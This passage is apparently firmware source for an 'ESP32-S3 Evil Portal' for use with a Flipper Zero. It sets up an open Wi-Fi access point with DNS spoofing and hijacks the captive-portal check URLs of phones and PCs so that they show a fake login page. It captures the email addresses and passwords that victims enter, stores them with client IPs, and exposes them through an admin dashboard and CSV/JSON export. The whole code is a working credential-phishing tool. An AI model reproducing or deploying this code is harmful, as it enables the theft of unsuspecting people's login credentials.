    JsonArray logs = doc["logs"].as<JsonArray>();
    for (size_t i = 0; i < logs.size(); i++) {
        if (logs[i]["id"] == id) {
            logs.remove(i);
            f = SPIFFS.open("/logs.json", "w");
            if (f) { serializeJson(doc, f); f.close(); }
            totalCaptures = logs.size();
            return true;
        }
    }
    return false;
}

void clearAllLogs() {
    if (spiffsAvailable) {
        File f = SPIFFS.open("/logs.json", "w");
        if (f) { f.println("{\"logs\":[]}"); f.close(); }
    }
    totalCaptures = 0;
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

bool checkAuth(AsyncWebServerRequest *request) {
    return request->authenticate(adminUser.c_str(), adminPass.c_str());
}

bool isDefaultCredentials() {
    return (adminUser == DEFAULT_ADMIN_USER && adminPass == DEFAULT_ADMIN_PASS);
}

String getActiveSSID() {
    return flipperMode ? String(flipperApName) : portalSSID;
}

// ============================================================================
// FLIPPER PORTAL CONTROL
// ============================================================================

void startFlipperPortal() {
    if (flipperPortalRunning) return;
    if (!hasFlipperHtml || !hasFlipperAp) return;
    
    DebugSerial.println("\n##################################################");
    DebugSerial.println("#        STARTING FLIPPER PORTAL                 #");
    DebugSerial.print("# AP: "); DebugSerial.println(flipperApName);
    DebugSerial.print("# HTML: "); DebugSerial.print(strlen(flipperHtml)); DebugSerial.println(" bytes");
    
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    WiFi.softAP(flipperApName, "");
    delay(500);
    
    DebugSerial.print("# IP: "); DebugSerial.println(WiFi.softAPIP());
    flipperMode = true;
    flipperPortalRunning = true;
    ledReady();
    DebugSerial.println("# STATUS: FLIPPER PORTAL RUNNING!");
    DebugSerial.println("##################################################");
}

void stopFlipperPortal() {
    if (!flipperPortalRunning) return;
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(portalSSID.c_str(), "");
    flipperMode = false;
    flipperPortalRunning = false;
    hasFlipperHtml = false;
    hasFlipperAp = false;
    memset(flipperHtml, 0, MAX_HTML_SIZE);
    memset(flipperApName, 0, 30);
    DebugSerial.println("[FLIPPER] Portal stopped, back to standalone mode");
}

void checkAndAutoStartFlipper() {
    if (hasFlipperHtml && hasFlipperAp && !flipperPortalRunning) {
        DebugSerial.println("[AUTO] Both AP and HTML ready - sending 'all set'");
        sendToFlipper("all set");
        delay(100);
        startFlipperPortal();
    }
}

// ============================================================================
// FLIPPER COMMAND PROCESSING
// ============================================================================

void processFlipperLine(String line) {
    DebugSerial.print("[←FLIP] '"); DebugSerial.print(line); DebugSerial.println("'");
    String trimmed = line;
    trimmed.trim();
    
    if (receivingHtml) {
        htmlLineCount++;
        htmlBuffer += line + "\n";
        String lower = line;
        lower.toLowerCase();
        if (lower.indexOf("</html>") >= 0) {
            if (htmlBuffer.length() < MAX_HTML_SIZE) {
                htmlBuffer.toCharArray(flipperHtml, MAX_HTML_SIZE);
                hasFlipperHtml = true;
                DebugSerial.print("[HTML] Complete: "); DebugSerial.print(htmlBuffer.length()); DebugSerial.println(" bytes");
                sendToFlipper("html set");
            }
            htmlBuffer = "";
            receivingHtml = false;
            htmlLineCount = 0;
            checkAndAutoStartFlipper();
        }
        return;
    }
    
    if (trimmed.startsWith("sethtml=")) {
        DebugSerial.println("[CMD] sethtml received");
        receivingHtml = true;
        htmlLineCount = 1;
        String content = trimmed.substring(8);
        htmlBuffer = content + "\n";
        String lower = content;
        lower.toLowerCase();
        if (lower.indexOf("</html>") >= 0) {
            htmlBuffer.toCharArray(flipperHtml, MAX_HTML_SIZE);
            hasFlipperHtml = true;
            sendToFlipper("html set");
            htmlBuffer = "";
            receivingHtml = false;
            checkAndAutoStartFlipper();
        }
        return;
    }
    
    if (trimmed.startsWith("setap=")) {
        String ap = trimmed.substring(6);
        ap.trim();
        if (ap.length() > 0 && ap.length() < 30) {
            ap.toCharArray(flipperApName, 30);
            hasFlipperAp = true;
            DebugSerial.print("[CMD] setap: '"); DebugSerial.print(flipperApName); DebugSerial.println("'");
            sendToFlipper("ap set");
            checkAndAutoStartFlipper();
        }
        return;
    }
    
    if (trimmed.equalsIgnoreCase("start")) { DebugSerial.println("[CMD] start"); if (hasFlipperHtml && hasFlipperAp) startFlipperPortal(); return; }
    if (trimmed.equalsIgnoreCase("stop")) { DebugSerial.println("[CMD] stop"); stopFlipperPortal(); return; }
    if (trimmed.equalsIgnoreCase("reset")) { DebugSerial.println("[CMD] reset"); delay(100); ESP.restart(); return; }
    if (trimmed.equalsIgnoreCase("ack")) { return; }
}

// ============================================================================
// CAPTIVE PORTAL HANDLER
// ============================================================================

class CaptiveRequestHandler : public AsyncWebHandler {
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}
    bool canHandle(AsyncWebServerRequest *request) {
        String url = request->url();
        if (url.startsWith("/admin") || url.startsWith("/api") || url.startsWith("/ping") || url.startsWith("/factory-reset")) return false;
        return true;
    }
    void handleRequest(AsyncWebServerRequest *request) {
        if (flipperMode && hasFlipperHtml) request->send_P(200, "text/html", flipperHtml);
        else request->send_P(200, "text/html", portal_html);
    }
};

// ============================================================================
// CREDENTIAL CAPTURE HANDLER
// ============================================================================

void handleCredentialCapture(AsyncWebServerRequest *request) {
    String email = "";
    String password = "";
    if (request->hasParam("email")) email = request->getParam("email")->value();
    else if (request->hasParam("username")) email = request->getParam("username")->value();
    if (request->hasParam("password")) password = request->getParam("password")->value();
    
    if (email.length() > 0 || password.length() > 0) {
        String clientIP = request->client()->remoteIP().toString();
        DebugSerial.println("\n╔══════════════════════════════════════╗");
        DebugSerial.println("║      CREDENTIALS CAPTURED!           ║");
        DebugSerial.println("╠══════════════════════════════════════╣");
        DebugSerial.print("║ Email:    "); DebugSerial.println(email);
        DebugSerial.print("║ Password: "); DebugSerial.println(password);
        DebugSerial.print("║ IP:       "); DebugSerial.println(clientIP);
        DebugSerial.print("║ Mode:     "); DebugSerial.println(flipperMode ? "Flipper" : "Standalone");
        DebugSerial.println("╚══════════════════════════════════════╝");
        if (flipperMode) sendToFlipper("client connected");
        saveCredential(email, password, clientIP, flipperMode);
        blinkAlert(3);
    }
    
    const uint8_t gif[] = { 0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x01, 0x44, 0x00, 0x3b };
    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/gif", gif, sizeof(gif));
    request->send(response);
}

// ============================================================================
// API ROUTES
// ============================================================================

void setupAPIRoutes() {
    server.on("/ping", HTTP_GET, [](AsyncWebServerRequest *request) { request->send(200, "text/plain", "pong"); });
    
    server.on("/factory-reset", HTTP_GET, [](AsyncWebServerRequest *request) {
        adminUser = DEFAULT_ADMIN_USER; adminPass = DEFAULT_ADMIN_PASS; portalSSID = DEFAULT_SSID;
        saveConfig(); clearAllLogs();
        request->send(200, "text/html", "<html><body style='background:#0f172a;color:#e2e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'><div style='text-align:center;'><h1 style='color:#10b981;'>Factory Reset Complete</h1><p>Username: <code>admin</code><br>Password: <code>admin</code></p><a href='/admin' style='color:#3b82f6;'>Go to Admin</a></div></body></html>");
    });
    
    server.on("/api/v1/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        JsonDocument doc;
        doc["version"] = FIRMWARE_VERSION; doc["uptime"] = millis() / 1000; doc["ssid"] = getActiveSSID();
        doc["ip"] = WiFi.softAPIP().toString(); doc["credentials_count"] = totalCaptures;
        doc["memory_free"] = ESP.getFreeHeap(); doc["spiffs_available"] = spiffsAvailable;
        doc["flipper_mode"] = flipperMode; doc["default_creds"] = isDefaultCredentials();
        String response; serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    server.on("/api/v1/dashboard", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->send(401, "application/json", "{\"error\":\"unauthorized\"}"); return; }
        String json = "{\"version\":\"" + String(FIRMWARE_VERSION) + "\",\"uptime\":" + String(millis()/1000) + ",\"ssid\":\"" + getActiveSSID() + "\",\"credentials_count\":" + String(totalCaptures) + ",\"memory_free\":" + String(ESP.getFreeHeap()) + ",\"flipper_mode\":" + String(flipperMode ? "true" : "false") + ",\"default_creds\":" + String(isDefaultCredentials() ? "true" : "false") + ",\"recent_logs\":[";
        if (spiffsAvailable) {
            File f = SPIFFS.open("/logs.json", "r");
            if (f) {
                JsonDocument doc; deserializeJson(doc, f); f.close();
                JsonArray logs = doc["logs"].as<JsonArray>();
                int start = logs.size() > 5 ? logs.size() - 5 : 0;
                bool first = true;
                for (size_t i = start; i < logs.size(); i++) {
                    if (!first) json += ","; first = false;
                    json += "{\"id\":" + String((int)logs[i]["id"]) + ",\"timestamp\":" + String((unsigned long)logs[i]["timestamp"]) + ",\"email\":\"" + logs[i]["email"].as<String>() + "\",\"password\":\"" + logs[i]["password"].as<String>() + "\"}";
                }
            }
        }
        json += "]}";
        request->send(200, "application/json", json);
    });
    
    server.on("/api/v1/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->send(401, "application/json", "{\"error\":\"unauthorized\"}"); return; }
        request->send(200, "application/json", getLogsJson());
    });
    
    server.on("/api/v1/logs", HTTP_DELETE, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->send(401, "application/json", "{\"error\":\"unauthorized\"}"); return; }
        clearAllLogs();
        request->send(200, "application/json", "{\"success\":true,\"message\":\"Logs cleared\"}");
    });
    
    server.on("/api/v1/config", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->send(401, "application/json", "{\"error\":\"unauthorized\"}"); return; }
        JsonDocument doc; doc["ssid"] = portalSSID; doc["admin_user"] = adminUser; doc["flipper_mode"] = flipperMode;
        String response; serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    server.on("/api/v1/export/json", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        String filename = "portal_logs_" + String(millis()) + ".json";
        AsyncWebServerResponse *response = request->beginResponse(200, "application/json", getLogsJson());
        response->addHeader("Content-Disposition", "attachment; filename=" + filename);
        request->send(response);
    });
    
    server.on("/api/v1/export/csv", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        String csv = "ID,Timestamp,Email,Password,SSID,Client_IP,Source\n";
        if (spiffsAvailable) {
            File f = SPIFFS.open("/logs.json", "r");
            if (f) {
                JsonDocument doc; deserializeJson(doc, f); f.close();
                JsonArray logs = doc["logs"].as<JsonArray>();
                for (JsonObject log : logs) {
                    csv += String((int)log["id"]) + "," + String((unsigned long)log["timestamp"]) + ",\"" + log["email"].as<String>() + "\",\"" + log["password"].as<String>() + "\",\"" + log["ssid"].as<String>() + "\"," + log["client_ip"].as<String>() + "," + log["source"].as<String>() + "\n";
                }
            }
        }
        String filename = "portal_logs_" + String(millis()) + ".csv";
        AsyncWebServerResponse *response = request->beginResponse(200, "text/csv", csv);
        response->addHeader("Content-Disposition", "attachment; filename=" + filename);
        request->send(response);
    });
    
    server.on("/api/v1/reboot", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->send(401, "application/json", "{\"error\":\"unauthorized\"}"); return; }
        request->send(200, "application/json", "{\"success\":true}");
        delay(1000); ESP.restart();
    });
}

void handleDeleteLog(AsyncWebServerRequest *request) {
    if (!checkAuth(request)) { request->requestAuthentication(); return; }
    String url = request->url();
    int lastSlash = url.lastIndexOf('/');
    int id = url.substring(lastSlash + 1).toInt();
    if (deleteCredential(id)) request->send(200, "application/json", "{\"success\":true}");
    else request->send(404, "application/json", "{\"error\":\"Not found\"}");
}

void handleConfigUpdate(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
    if (!checkAuth(request)) { request->requestAuthentication(); return; }
    static String body;
    if (index == 0) body = "";
    for (size_t i = 0; i < len; i++) body += (char)data[i];
    if (index + len == total) {
        JsonDocument doc;
        if (deserializeJson(doc, body)) { request->send(400, "application/json", "{\"error\":\"Invalid JSON\"}"); return; }
        bool restartRequired = false;
        if (doc["ssid"].is<const char*>()) {
            String newSSID = doc["ssid"].as<String>();
            if (newSSID != portalSSID && newSSID.length() > 0 && newSSID.length() <= 32) { portalSSID = newSSID; restartRequired = true; }
        }
        if (doc["admin_user"].is<const char*>()) { String newUser = doc["admin_user"].as<String>(); if (newUser.length() > 0) adminUser = newUser; }
        if (doc["admin_pass"].is<const char*>()) { String newPass = doc["admin_pass"].as<String>(); if (newPass.length() > 0) adminPass = newPass; }
        saveConfig();
        String response = "{\"success\":true,\"restart_required\":" + String(restartRequired ? "true" : "false") + "}";
        request->send(200, "application/json", response);
    }
}

// ============================================================================
// ADMIN ROUTES
// ============================================================================

void setupAdminRoutes() {
    server.on("/admin/logs", HTTP_GET, [](AsyncWebServerRequest *request) { if (!checkAuth(request)) return request->requestAuthentication(); request->send_P(200, "text/html", admin_logs_html); });
    server.on("/admin/config", HTTP_GET, [](AsyncWebServerRequest *request) { if (!checkAuth(request)) return request->requestAuthentication(); request->send_P(200, "text/html", admin_config_html); });
    server.on("/admin/export", HTTP_GET, [](AsyncWebServerRequest *request) { if (!checkAuth(request)) return request->requestAuthentication(); request->send_P(200, "text/html", admin_export_html); });
    server.on("/admin/logout", HTTP_GET, [](AsyncWebServerRequest *request) { request->send(200, "text/html", "<html><body style='background:#0f172a;color:#e2e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'><div style='text-align:center;'><h1>Logged Out</h1><a href='/admin' style='color:#3b82f6;'>Login Again</a></div></body></html>"); });
    server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) { if (!checkAuth(request)) return request->requestAuthentication(); request->send_P(200, "text/html", admin_dashboard_html); });
}

// ============================================================================
// CAPTIVE PORTAL ROUTES
// ============================================================================

void setupCaptivePortalRoutes() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (flipperMode && hasFlipperHtml) request->send_P(200, "text/html", flipperHtml);
        else request->send_P(200, "text/html", portal_html);
        if (flipperMode) sendToFlipper("client connected");
    });
    server.on("/get", HTTP_GET, handleCredentialCapture);
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
    server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->send_P(200, "text/html", flipperMode ? flipperHtml : portal_html); });
}

// ============================================================================
// SETUP
// ============================================================================

void setup() {
    setupLED();
    ledStarting();
    
    DebugSerial.begin(115200);
    delay(1000);
    FlipperSerial.begin(FLIPPER_BAUD);
    delay(100);
    
    DebugSerial.println("\n╔══════════════════════════════════════════════╗");
    DebugSerial.println("║  ESP32-S3 Evil Portal v" FIRMWARE_VERSION "        ║");
    DebugSerial.println("║  Flipper Zero + Standalone Edition           ║");
    DebugSerial.println("╚══════════════════════════════════════════════╝\n");
    
    initSPIFFS();
    
    DebugSerial.println("[*] Starting WiFi AP...");
    WiFi.disconnect();
    delay(100);
    WiFi.mode(WIFI_AP);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    WiFi.softAP(portalSSID.c_str(), "");
    delay(100);
    
    DebugSerial.print("[+] SSID: "); DebugSerial.println(portalSSID);
    DebugSerial.print("[+] IP:   "); DebugSerial.println(WiFi.softAPIP());
    
    setupCaptivePortalRoutes();
    setupAdminRoutes();
    setupAPIRoutes();
    
    server.on("^\\/api\\/v1\\/logs\\/(\\d+)$", HTTP_DELETE, handleDeleteLog);
    server.on("/api/v1/config", HTTP_POST, [](AsyncWebServerRequest *request) {}, NULL, handleConfigUpdate);
    
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", apIP);
    
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    
    DebugSerial.println("\n[+] Web server started");
    DebugSerial.println("[+] DNS server started");
    DebugSerial.println("[+] Flipper UART ready on GPIO 43/44");
    DebugSerial.println("[+] Admin: http://" + apIP.toString() + "/admin");
    DebugSerial.println("\n══════════════════════════════════════════════");
    DebugSerial.println("  Portal READY - Standalone + Flipper modes");
    DebugSerial.println("══════════════════════════════════════════════");
    
    ledReady();
}

// ============================================================================
// MAIN LOOP
// ============================================================================

void loop() {
    if (FlipperSerial.available() > 0) {
        String line = FlipperSerial.readStringUntil('\n');
        processFlipperLine(line);
    }
    if (DebugSerial.available() > 0) {
        String line = DebugSerial.readStringUntil('\n');
        processFlipperLine(line);
    }
    dnsServer.processNextRequest();
}
